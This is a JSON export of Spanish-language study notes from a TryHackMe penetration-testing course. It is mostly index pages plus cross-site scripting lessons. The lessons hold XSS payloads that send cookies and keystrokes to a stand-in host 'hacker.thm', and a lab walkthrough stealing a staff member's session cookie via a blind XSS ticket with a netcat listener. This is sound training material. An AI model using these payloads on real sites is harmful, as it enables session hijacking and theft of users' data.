    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 4. Advanced Client-Side Attacks > 4. CORS & SOP",
    "content": "[[1. Understanding SOP]]\n[[2. Understanding CORS]]\n[[3. ACAO in depth]]\n[[4. Common Misconfigurations]]\n[[5. Lab Connection]]\n[[6. Arbitrary Origin]]\n[[7. Bad Regex in Origin]]\n[[8. Null Origin]]",
    "modified": "2026-02-15T01:10:57"
  },
  {
    "title": "6. Arbitrary Origin",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/4-advanced-client-side-attacks/4-cors-sop/6-arbitrary-origin/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/4. Advanced Client-Side Attacks/4. CORS & SOP/6. Arbitrary Origin.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 4. Advanced Client-Side Attacks > 4. CORS & SOP",
    "content": "",
    "modified": "2026-02-15T01:10:57"
  },
  {
    "title": "3. DOM-Based Attacks",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/4-advanced-client-side-attacks/3-dom-based-attacks/3-dom-based-attacks/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/4. Advanced Client-Side Attacks/3. DOM-Based Attacks/3. DOM-Based Attacks.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 4. Advanced Client-Side Attacks > 3. DOM-Based Attacks",
    "content": "",
    "modified": "2026-02-15T01:10:57"
  },
  {
    "title": "2. Modern Frontend Frameworks",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/4-advanced-client-side-attacks/3-dom-based-attacks/2-modern-frontend-frameworks/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/4. Advanced Client-Side Attacks/3. DOM-Based Attacks/2. Modern Frontend Frameworks.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 4. Advanced Client-Side Attacks > 3. DOM-Based Attacks",
    "content": "",
    "modified": "2026-02-15T01:10:57"
  },
  {
    "title": "1. The DOM Explained",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/4-advanced-client-side-attacks/3-dom-based-attacks/1-the-dom-explained/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/4. Advanced Client-Side Attacks/3. DOM-Based Attacks/1. The DOM Explained.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 4. Advanced Client-Side Attacks > 3. DOM-Based Attacks",
    "content": "",
    "modified": "2026-02-15T01:10:57"
  },
  {
    "title": "0. DOM-Based Attacks",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/4-advanced-client-side-attacks/3-dom-based-attacks/0-dom-based-attacks/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/4. Advanced Client-Side Attacks/3. DOM-Based Attacks/0. DOM-Based Attacks.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 4. Advanced Client-Side Attacks > 3. DOM-Based Attacks",
    "content": "[[1. The DOM Explained]]\n[[2. Modern Frontend Frameworks]]\n[[3. DOM-Based Attacks]]\n[[4. DOM-Based XSS]]\n[[5. XSS Weaponisation]]\n[[6. DOM-Based Attack Challenge]]",
    "modified": "2026-02-15T01:10:57"
  },
  {
    "title": "4. DOM-Based XSS",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/4-advanced-client-side-attacks/3-dom-based-attacks/4-dom-based-xss/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/4. Advanced Client-Side Attacks/3. DOM-Based Attacks/4. DOM-Based XSS.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 4. Advanced Client-Side Attacks > 3. DOM-Based Attacks",
    "content": "",
    "modified": "2026-02-15T01:10:57"
  },
  {
    "title": "5. XSS Weaponisation",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/4-advanced-client-side-attacks/3-dom-based-attacks/5-xss-weaponisation/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/4. Advanced Client-Side Attacks/3. DOM-Based Attacks/5. XSS Weaponisation.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 4. Advanced Client-Side Attacks > 3. DOM-Based Attacks",
    "content": "",
    "modified": "2026-02-15T01:10:57"
  },
  {
    "title": "6. DOM-Based Attack Challenge",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/4-advanced-client-side-attacks/3-dom-based-attacks/6-dom-based-attack-challenge/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/4. Advanced Client-Side Attacks/3. DOM-Based Attacks/6. DOM-Based Attack Challenge.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 4. Advanced Client-Side Attacks > 3. DOM-Based Attacks",
    "content": "",
    "modified": "2026-02-15T01:10:57"
  },
  {
    "title": "1. Introduction to Cyber Security",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/1-introduction-to-cyber-security/1-introduction-to-cyber-security/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/1. Introduction to Cyber Security/1. Introduction to Cyber Security.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 1. Introduction to Cyber Security",
    "content": "1. [[Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/1. Introduction to Cyber Security/1. Offensive Security Intro/0. Offensive Security Intro]]\n2. [[Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/1. Introduction to Cyber Security/2. Defensive Security Intro/0. Defensive Security Intro]]\n3. [[Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/1. Introduction to Cyber Security/3. Careers in Cyber/0. Careers in Cyber]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "3. Introduction to Web Hacking",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/3-introduction-to-web-hacking/3-introduction-to-web-hacking/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/3. Introduction to Web Hacking/3. Introduction to Web Hacking.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 3. Introduction to Web Hacking",
    "content": "1. [[Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/3. Introduction to Web Hacking/1. Walking an Application/0. Walking an Application]]\n2. [[Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/3. Introduction to Web Hacking/2. Content Discovery/0. Content Discovery]]\n3. [[Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/3. Introduction to Web Hacking/3. Subdomain Enumeration/0. Subdomain Enumeration]]\n4. [[Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/3. Introduction to Web Hacking/4. Authentication Bypass/0. Authentication Bypass]]\n5. [[Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/3. Introduction to Web Hacking/5. IDOR/0. IDOR]]\n6. [[Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/3. Introduction to Web Hacking/6. File Inclusion/0. File Inclusion]]\n7. [[Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/3. Introduction to Web Hacking/7. Intro to SSRF/0. Intro to SSRF]]\n8. [[Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/3. Introduction to Web Hacking/8. Intro to Cross-site Scripting/0. Intro to Cross-site Scripting]]\n9. [[Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/3. Introduction to Web Hacking/9. Race Conditions/0. Race Conditions]]\n10. [[Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/3. Introduction to Web Hacking/10. Command Injection/0. Command Injection]]\n11. [[Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/3. Introduction to Web Hacking/11. SQL Injection/0. SQL Injection]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "2. Introduction to Pentesting",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/2-introduction-to-pentesting/2-introduction-to-pentesting/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/2. Introduction to Pentesting/2. Introduction to Pentesting.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 2. Introduction to Pentesting",
    "content": "1. [[0. Pentesting Fundamentals]]\n2. [[0. Principles of Security]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "4. Burp Suite",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/4-burp-suite/4-burp-suite/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/4. Burp Suite/4. Burp Suite.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 4. Burp Suite",
    "content": "1. [[Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/4. Burp Suite/1. Brup Suite - The Basics/0. Burp Suite - The Basics]]\n2. [[Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/4. Burp Suite/2. Burp Suite - Repeater/0. Burp Suite - Repeater]]\n3. [[Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/4. Burp Suite/3. Burp Suite - Intruder/0. Burp Suite - Intruder]]\n4. [[Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/4. Burp Suite/4. Burp Suite - Other Modules/0. Burp Suite - Other Modules]]\n5. [[Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/4. Burp Suite/5. Burp Suite - Extensions/0. Burp Suite - Extensions]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "6. Vulnerability Research",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/6-vulnerability-research/6-vulnerability-research/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/6. Vulnerability Research/6. Vulnerability Research.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 6. Vulnerability Research",
    "content": "1. [[0. Vulnerabilities 101]]\n2. [[0. Exploit Vulnerabilities]]\n3. [[Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/6. Vulnerability Research/3. Vulnerability Capstone/0. Vulnerability Capstone]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "7. Metasploit",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/7-metasploit/7-metasploit/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/7. Metasploit/7. Metasploit.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 7. Metasploit",
    "content": "1. [[Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/7. Metasploit/1. Metasploit - Introduction/0. Metasploit - Introduction]]\n2. [[Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/7. Metasploit/2. Metasploit - Exploitation/0. Metasploit - Exploitation]]\n3. [[Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/7. Metasploit/3. Metasploit - Meterpreter/0. Metasploit - Meterpreter]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "5. Network Security",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/5-network-security/5-network-security/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/5. Network Security/5. Network Security.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 5. Network Security",
    "content": "1. [[0. Passive Reconnaissance]]\n2. [[0. Active Reconnaissance]]\n3. [[0. Nmap Live Host Discovery]]\n4. [[0. Nmap Basic Port Scans]]\n5. [[0. Nmap Advanced Port Scans]]\n6. [[0. Nmap Post Port Scans]]\n7. [[0. Protocols and Servers]]\n8. [[0. Protocols and Servers 2]]\n9. [[Ciberseguridad/THM/Maquinas/2. Medium/2. Net Sec Challenge/0. Net Sec Challenge]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "8. Privilege Escalation",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/8-privilege-escalation/8-privilege-escalation/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/8. Privilege Escalation/8. Privilege Escalation.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 8. Privilege Escalation",
    "content": "1. [[0. What the Shell]]\n2. [[0. Linux Privilege Escalation]]\n3. [[0. Windows Privilege Escalation]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "1. Redireccion",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/1-introduction-to-cyber-security/1-offensive-security-intro/1-redireccion/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/1. Introduction to Cyber Security/1. Offensive Security Intro/1. Redireccion.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 1. Introduction to Cyber Security > 1. Offensive Security Intro",
    "content": "Para ver este curso ve a **THM -> 0. Pre Career -> 1. Pre Security -> 1. Introduction to cybersecurity -> 1. Offensive Security Intro**",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "0. Offensive Security Intro",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/1-introduction-to-cyber-security/1-offensive-security-intro/0-offensive-security-intro/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/1. Introduction to Cyber Security/1. Offensive Security Intro/0. Offensive Security Intro.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 1. Introduction to Cyber Security > 1. Offensive Security Intro",
    "content": "[[Ciberseguridad/THM/0. Pre Career/1. Pre Security/1. Introduction to cybersecurity/1. Offensive Security Intro/0. Offensive Security Intro]]\n[[Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/1. Introduction to Cyber Security/1. Offensive Security Intro/1. Redireccion]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "0. Careers in Cyber",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/1-introduction-to-cyber-security/3-careers-in-cyber/0-careers-in-cyber/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/1. Introduction to Cyber Security/3. Careers in Cyber/0. Careers in Cyber.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 1. Introduction to Cyber Security > 3. Careers in Cyber",
    "content": "[[Ciberseguridad/THM/0. Pre Career/1. Pre Security/1. Introduction to cybersecurity/3. Careers in Cyber/0. Careers in Cyber]]\n[[Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/1. Introduction to Cyber Security/3. Careers in Cyber/1. Redireccion]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "1. Redireccion",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/1-introduction-to-cyber-security/3-careers-in-cyber/1-redireccion/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/1. Introduction to Cyber Security/3. Careers in Cyber/1. Redireccion.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 1. Introduction to Cyber Security > 3. Careers in Cyber",
    "content": "Para ver este curso ve a **THM -> 0. Pre Career -> 1. Pre Security -> 1. Introduction to cybersecurity -> 3. Careers in Cyber**",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "0. Defensive Security Intro",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/1-introduction-to-cyber-security/2-defensive-security-intro/0-defensive-security-intro/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/1. Introduction to Cyber Security/2. Defensive Security Intro/0. Defensive Security Intro.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 1. Introduction to Cyber Security > 2. Defensive Security Intro",
    "content": "[[0. Deffensive Security Intro]]\n[[Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/1. Introduction to Cyber Security/2. Defensive Security Intro/1. Redireccion]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "1. Redireccion",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/1-introduction-to-cyber-security/2-defensive-security-intro/1-redireccion/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/1. Introduction to Cyber Security/2. Defensive Security Intro/1. Redireccion.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 1. Introduction to Cyber Security > 2. Defensive Security Intro",
    "content": "Para ver este curso ve a **THM -> 0. Pre Career -> 1. Pre Security -> 1. Introduction to cybersecurity -> 2. Defensive Security Intro**",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "8. Practical Example (Blind XSS)",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/3-introduction-to-web-hacking/8-intro-to-cross-site-scripting/8-practical-example-blind-xss/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/3. Introduction to Web Hacking/8. Intro to Cross-site Scripting/8. Practical Example (Blind XSS).md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 3. Introduction to Web Hacking > 8. Intro to Cross-site Scripting",
    "content": "1. Vamos al sitio web que nos dan.\n   ![[Pasted image 20251109113901.png]]\n2. Para este reto vamos a buscar alg√∫n sitio en el que introducir texto y que quede reflejado. Siguiendo lo que hemos visto podemos recordar que el espacio donde se crean tickets en una p√°gina podr√≠a tener una Blind XSS.\n   \n   ![[Pasted image 20251109114101.png]]\n3. Vemos el panel de entrada:\n   ![[Pasted image 20251109114145.png]]\n4. Empezaremos probando con un \"test\" para ver donde se refleja. Si abrimos el ticket podemos ver lo siguiente:\n   ![[Pasted image 20251109114321.png]]\n5. Y revisando el c√≥digo fuente:\n   ![[Pasted image 20251109114352.png]]\n6. Vemos que est√° dentro de una etiqueta `<textarea>`. Vamos a aplicar lo aprendido para bypassearlo. Usaremos alert() para comprobarlo: `</textarea><script>alert('THM');</script>`. Si abrimos el ticket:\n   ![[Pasted image 20251109120330.png]]\n7. Podemos estar seguros casi al 100% de que un miembro del staff ver√° el ticket, por lo que vamos a intentar robar su cookie de sesi√≥n. Para ello:\n\t1. Nos ponemos en escucha con `nc`:\n\t   ![[Pasted image 20251109120648.png]]\n\t2. Introducimos el payload necesario: `</textarea><script>fetch('http://URL_O_IP_ATACANTE:PUERTO_ATACANTE?cookie=' + btoa(document.cookie) );</script>.\n\t   ![[Pasted image 20251109121218.png]]\n\t   \n\t   - El comando `fetch()` hace una petici√≥n HTTP.\n\t   - El comando `btoa()` base64-encodea la string.\n\t   - `document.cookie` accede a la cookie de la v√≠ctima para ese sitio.\n\t3. Esperamos la conexi√≥n.\n\t   ![[Pasted image 20251109121312.png]]\n\t4. Si alguien abre el ticket:\n\t   ![[Pasted image 20251109122011.png]]\n8. Ah√≠ podemos ver la cookie, que la desencodearemos:\n   ![[Pasted image 20251109122109.png]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "3. Reflected XSS",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/3-introduction-to-web-hacking/8-intro-to-cross-site-scripting/3-reflected-xss/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/3. Introduction to Web Hacking/8. Intro to Cross-site Scripting/3. Reflected XSS.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 3. Introduction to Web Hacking > 8. Intro to Cross-site Scripting",
    "content": "EL XSS reflejado ocurre cuando informaci√≥n ofrecida por el usuario en una petici√≥n HTTP es incluida en la p√°gina web sin ninguna validaci√≥n.\n\n-------------------------------------\n<h2>Escenario de ejemplo</h2>\nUn servidor donde si introduces el input incorrecto, se muestra un mensaje de error. El contenido del mensaje de error se toma del par√°metro **error** en la query string y se construye directamente en el c√≥digo fuente.\n\n![[Pasted image 20251106195837.png]]\n![[Pasted image 20251106195841.png]]\n\nLa aplicaci√≥n no comprueba el contenido del par√°metro **error**, lo que permite al atacante insertar c√≥digo malicioso.\n\n![[Pasted image 20251106195929.png]]\n![[Pasted image 20251106195931.png]]\n\nLa vulnerabilidad puede ser usada para un caso como el de la imagen de abajo:\n\n![[Pasted image 20251106195958.png]]\n\n------------------------------\n<h2>Impacto Potencial</h2>\nEl atacante podr√≠a mandar links o incrustarlos en otra p√°gina web que contenga un payload JavaScript a v√≠ctimas potenciales haciendo que lo ejecuten en sus navegadores, potencialmente revelando informaci√≥n de cliente o sesi√≥n.\n\n----------------------------\n<h2>C√≥mo Comprobar Reflected XSS</h2>\nNecesitar√°s comprobar cada posible punto de entrada, estos incluyen:\n\n- Par√°metros en la query string de la URL.\n- Ruta de Archivo de la URL.\n- A veces Headers HTTP (aunque poco probable explotaci√≥n pr√°ctica).\n\nUna vez hayas encontrado informaci√≥n reflejada en la aplicaci√≥n web, debes confirmar que puedes ejecutar tu payload JavaScript. Este ser√° dependiente de d√≥nde en la aplicaci√≥n se refleje tu c√≥digo.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "2. XSS Payloads",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/3-introduction-to-web-hacking/8-intro-to-cross-site-scripting/2-xss-payloads/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/3. Introduction to Web Hacking/8. Intro to Cross-site Scripting/2. XSS Payloads.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 3. Introduction to Web Hacking > 8. Intro to Cross-site Scripting",
    "content": "<h2>¬øQu√© es un Payload?</h2>\nEn XSS, el payload es el c√≥digo JavaScript que se ejecuta en el ordenador del objetivo. Hay dos partes de un payload, la intenci√≥n y la modificaci√≥n.\n\nLa intenci√≥n es lo que querr√≠as que JavaScript hiciera y la modificaci√≥n son los cambios que debemos hacerle al c√≥digo para que se ejecute porque cada escenario es diferente.\n\nAlgunos ejemplos de Intenciones:\n\n<h4>Proof of Concept (PoC)</h4>\nEs el payload m√°s simple donde lo √∫nico que quieres es demostrar que puedes conseguir XSS en un sitio web. Esto, normalmente es hecho causando una caja de alerta que popea en la p√°gina con una string de texto, por ejemplo:\n\n```javascript\n<script>alert('XSS');</script>\n```\n\n<h4>Robo de Sesi√≥n</h4>\nLos detalles de sesi√≥n de un usuario, como los tokens de inicio de sesi√≥n, normalmente se guardan en la m√°quina del objetivo en cookies. El c√≥digo JavaScript de debajo coge el valor de la cookie del objetivo, la base64-encodea para asegurar la transmisi√≥n y las postea (`POST`) hacia un sitio web bajo el dominio del hacker. Una vez que el hacker tiene las cookies, pueden tomar la sesi√≥n de ese usuario y \"ser\" ese usuario.\n\n```javascript\n<script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>\n```\n\n<h4>KeyLogger</h4>\nEl c√≥digo de abajo act√∫a como un KeyLogger (registrador de teclas). Esto significa que todo lo que teclees en una p√°gina ser√° redirigido hacia el sitio web bajo el control del atacante. Esto ser√≠a especialmente da√±ino si el c√≥digo fuera instalado en una p√°gina de registro o de compra, por ejemplo.\n\n```javascript\n<script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>\n```\n\n<h4>Business Logic</h4>\nEste payload es mucho m√°s espec√≠fico que los ejemplos de arriba. Este ir√≠a de llamar a un recurso de red particular o funci√≥n de JavaScript. Por ejemplo, imagina una funci√≥n de JavaScript para cambiar la direcci√≥n de correo electr√≥nico del usuario llamada `user.changeEmail()`. Tu payload podr√≠a verse as√≠:\n\n```javascript\n<script>user.changeEmail('attacker@hacker.thm');</script>\n```\n\nAhora que la direcci√≥n de correo electr√≥nico para la cuenta ha cambiado, el atacante puede proceder a cambiar la contrase√±a.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "0. Intro to Cross-site Scripting",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/3-introduction-to-web-hacking/8-intro-to-cross-site-scripting/0-intro-to-cross-site-scripting/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/3. Introduction to Web Hacking/8. Intro to Cross-site Scripting/0. Intro to Cross-site Scripting.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 3. Introduction to Web Hacking > 8. Intro to Cross-site Scripting",
    "content": "[[Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/3. Introduction to Web Hacking/8. Intro to Cross-site Scripting/1. Brief]]\n[[2. XSS Payloads]]\n[[3. Reflected XSS]]\n[[4. Stored XSS]]\n[[5. DOM Based XSS]]\n[[6. Blind XSS]]\n[[7. Perfecting Your Payload]]\n[[8. Practical Example (Blind XSS)]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "1. Brief",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/3-introduction-to-web-hacking/8-intro-to-cross-site-scripting/1-brief/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/3. Introduction to Web Hacking/8. Intro to Cross-site Scripting/1. Brief.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 3. Introduction to Web Hacking > 8. Intro to Cross-site Scripting",
    "content": "Cross-Site Scripting, mejor conocido como XSS es una vulnerabilidad clasificada como un ataque de inyecci√≥n, donde JavaScript malicioso es inyectado en una aplicaci√≥n web con la intenci√≥n de ser ejecutado por otros usuarios. En esta unidad aprenderemos sobre los diferentes tipos de XSS, c√≥mo crear payloads XSS, c√≥mo modificar los payloads y elevar los filtros y acabaremos con un laboratorio pr√°ctico.\n\nLas vulnerabilidades XSS son extremadamente comunes (por desgracia). Aqu√≠ algunos de los reportes de XSS encontrados en grandes compa√±√≠as:\n\n- [Shopify](https://hackerone.com/reports/415484)\n- [Stream Chat](https://hackerone.com/reports/409850)\n- [HackerOne](https://hackerone.com/reports/449351)\n- [InfoGram](https://hackerone.com/reports/283825)\n\n----------------------------\n<h2>Pre-requisitos</h2>\nMerece la pena darse cuenta de que XSS est√° basado en JavaScript, as√≠ que ayudar√≠a que supieras los conceptos b√°sicos de este lenguaje. De cualquier forma, ninguno de los ejemplos es excesivamente complicado.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "7. Perfecting Your Payload",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/3-introduction-to-web-hacking/8-intro-to-cross-site-scripting/7-perfecting-your-payload/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/3. Introduction to Web Hacking/8. Intro to Cross-site Scripting/7. Perfecting Your Payload.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 3. Introduction to Web Hacking > 8. Intro to Cross-site Scripting",
    "content": "El payload es el c√≥digo JavaScript que queremos ejecutar en el navegador de otro usuario o como prueba para demostrar una vulnerabilidad en una p√°gina web.\n\nEl payload puede tener varias intenciones, desde s√≥lo mostrar una alerta en una caja a probar que podemos ejecutar c√≥digo JavaScript en la p√°gina del usuario para extraer informaci√≥n de la p√°gina o de la sesi√≥n del usuario.\n\nC√≥mo se refleja el payload JavaScript en la web del objetivo, determina el payload que debes usar. \n\n-------------------------------------\n<h2>Nivel 1</h2>\nSe te presenta un formulario pidi√©ndote que introduzcas tu nombre y una vez lo haces se te mostrar√° en una l√≠nea abajo, por ejemplo:\n\n![[Pasted image 20251108213217.png]]\n\nSi ves el c√≥digo fuente de la p√°gina ver√°s tu nombre reflejado all√≠:\n\n![[Pasted image 20251108213302.png]]\n\nEn vez de introducir tu nombre vamos a introducir una alerta JavaScript: `<script>alert('THM');</script>`.\n\nAhora cuando hacemos click en subir, recibiremos un pop up de alerta. Con la string **THM**.\n\n![[Pasted image 20251108213527.png]]\n\nY el c√≥digo fuente reflejar√° lo siguiente:\n\n![[Pasted image 20251108213632.png]]\n\n------------------------------\n<h2>Nivel 2</h2>\nComo el primer nivel se nos pide que metamos un nombre, pero ahora ya no sale reflejado en el HTML de la misma manera, sino dentro de una etiqueta de input:\n\n![[Pasted image 20251108213908.png]]\n\nMiramos el c√≥digo fuente y vemos que aparece dentro del atributo 